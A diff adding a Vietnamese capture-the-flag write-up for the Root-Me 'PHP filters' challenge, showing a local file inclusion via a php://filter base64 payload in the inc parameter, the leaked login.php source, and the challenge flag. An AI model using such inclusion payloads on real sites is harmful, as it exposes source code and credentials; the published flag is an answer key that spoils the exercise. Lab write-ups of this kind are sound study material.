@@ -133,6 +133,46 @@ Cái tên nói lên tất cả, chỉ cần sửa tên file thành _kid.php%00.p
 
 ###16. PHP filters
 
+**Link:** [http://challenge01.root-me.org/web-serveur/ch12/](http://challenge01.root-me.org/web-serveur/ch12/)
+
+Tớ thấy có 2 link _http://challenge01.root-me.org/web-serveur/ch12/?inc=accueil.php_ và _http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php_. Có vẻ như có LFI chỗ này, thử thay _inc=../_ thì bắn ra lỗi, LFI thật :3
+
+Nhưng vấn đề là đọc file nào bây giờ, chả có gợi ý nào cả. Thôi đi hỏi anh Goócle (có bà chị làm cùng công ty nói hồi bé bà í toàn đọc như thế, hihi): _"PHP filter local file inclusion"_. Thấy ngay một bài blog có tựa đề _"Using php://filter for local file inclusion"_. Hóa ra ta có thể đọc nội dung nằm giữa _<?php_ và _?>_ bằng cách sử dụng _php://filter/convert.base64-encode/resource_ (có từ phiên bản PHP 5.0 trở đi). Quay lại thử đọc file login.php xem dư lào:
+```
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php
+```
+
+Hê hê, ra một đoạn base64, decode base64 thì được:
+'''php
+<?php
+include("config.php");
+
+if ( isset($_POST["username"]) && isset($_POST["password"]) ){
+    if ($_POST["username"]==$username && $_POST["password"]==$password){
+      print("<h2>Welcome back !</h2>");
+      print("To validate the challenge use this password<br/><br/>");
+    } else {
+      print("<h3>Error : no such user/password</h2><br />");
+    }
+} else {
+?>
+
+<form action="" method="post">
+  Login&nbsp;<br/>
+  <input type="text" name="username" /><br/><br/>
+  Password&nbsp;<br/>
+  <input type="password" name="password" /><br/><br/>
+  <br/><br/>
+  <input type="submit" value="connect" /><br/><br/>
+</form>
+
+<?php } ?>
+'''
+
+Lại phát hiện ra một file _config.php_ nữa. Đọc tiếp file này thì ra flag. Hết!
+
+**Flag:** _DAPt9D2mky0APAF_
+
 ###17. PHP register globals
 
 ###18. Local File Inclusion
